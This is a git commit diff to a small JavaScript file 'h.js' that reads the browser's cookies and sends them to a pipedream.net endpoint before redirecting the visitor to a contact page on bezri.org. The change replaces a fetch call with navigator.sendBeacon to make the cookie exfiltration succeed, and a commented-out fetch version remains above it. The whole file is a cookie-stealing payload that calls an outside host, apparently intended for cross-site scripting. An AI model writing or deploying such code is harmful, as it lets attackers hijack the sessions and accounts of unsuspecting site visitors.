1ad43f0f9ccc0545185462a77cace4422fa64f6a
h88u <159571030+h88u@users.noreply.github.com>
2024-02-10 14:36:24 -0500

    Update h.js

--- h.js
+++ h.js
@@ -1,4 +1,4 @@
 //fetch('https://eoqo7l6qsvoadu4.m.pipedream.net', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:document.cookie})});
-fetch('https://eoqo7l6qsvoadu4.m.pipedream.net', JSON.stringify({data:document.cookie})});
+navigator.sendBeacon('https://eoqo7l6qsvoadu4.m.pipedream.net', JSON.stringify({data:document.cookie})});
 window.location.href = 'https://www.bezri.org/contact_us.php';
 
